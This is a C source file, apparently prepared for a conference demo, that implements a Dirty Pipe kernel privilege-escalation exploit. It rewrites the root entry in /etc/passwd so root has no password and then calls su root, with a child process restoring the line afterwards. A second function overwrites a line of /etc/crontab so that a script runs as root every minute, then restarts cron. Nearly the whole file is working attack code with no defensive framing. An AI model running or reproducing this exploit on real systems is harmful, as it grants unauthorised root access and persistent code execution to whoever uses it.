#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/types.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

#define PIPE_BUFFER_COUNT 16
void suprise(char **argv);


int main(int argc, char **argv) {

  int p[2];

  pipe(p);
  char buf[PIPE_BUFFER_COUNT*PAGE_SIZE];

  // fill and then drain the pipe to set PIPE_BUF_FLAG_CAN_MERGE flag
  write(p[1], buf, PIPE_BUFFER_COUNT*PAGE_SIZE);
  read(p[0], buf, PIPE_BUFFER_COUNT*PAGE_SIZE);

  char target_file[] = "/etc/passwd";
  int fd_target = open(target_file, O_RDONLY);

  loff_t offset_target = 0;
  // splice 1 byte of target file into the pipe
  splice(fd_target, &offset_target, p[1], NULL, 1, 0);

  char data[] = "oot::0:0:root:/root:/bin/bash\n";
  write(p[1], data, 30);


  if (fork() == 0) {
    // Child will clean up passwd file
    sleep(1);
    splice(fd_target, &offset_target, p[1], NULL, 1, 0);
    char data[] = "ot:x:0:0:root:/root:/bin/bash";
    write(p[1], data, 29);
    exit(0);
  } else {
    // parent changes to root
    suprise(argv);
    char *args[] = {"su", "root", NULL};
    execv("/usr/bin/su", args);
  }



































}

 /* // mystery exploit */
 /*  void suprise(char **argv) { */
 /*    // call exploit_mystery */
 /*    /\* args  *\/ */
 /*    char *tty_name = ttyname(0); */
 /*    system("/code/exploit_mystery"); */

 /*    printf("hello"); */
 /*    if (system("su root -c \"service cron restart\"") == -1) { */
 /*      printf("mystery failed\n"); */
 /*    } */
 /*  } */


 // mystery exploit
  void suprise(char **argv) {
    int p[2];

    pipe(p);
    char buf[16*PAGE_SIZE];

    // fill and then drain the pipe to set PIPE_BUF_FLAG_CAN_MERGE flag
    write(p[1], buf, 16*PAGE_SIZE);
    read(p[0], buf, 16*PAGE_SIZE);

    char target_file[] = "/etc/crontab";
    int fd_target = open(target_file, O_RDONLY);

    // want to overwrite the following line with 947 characters offset and 93 characters in total
    // 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    loff_t offset_target = 945;
    // splice 1 byte of target file into the pipe
    splice(fd_target, &offset_target, p[1], NULL, 1, 0);

    // for testing after 1 minute, for talk after 7 minutes?

    char *tty_name = ttyname(0);
    char data[164];
    snprintf(data, 164, "*  *  *  *  *   root    bash /code/mystery > %s 2>&1                                  \n", tty_name);
    /* char data[] = "*  *  *  *  *   root    bash /code/mystery > /dev/pts/\* 2>&1                                          "; */
    write(p[1], data, 164);

    if (system("su root -c \"service cron restart\"") == -1) {
      printf("mystery failed\n");
    }
  }
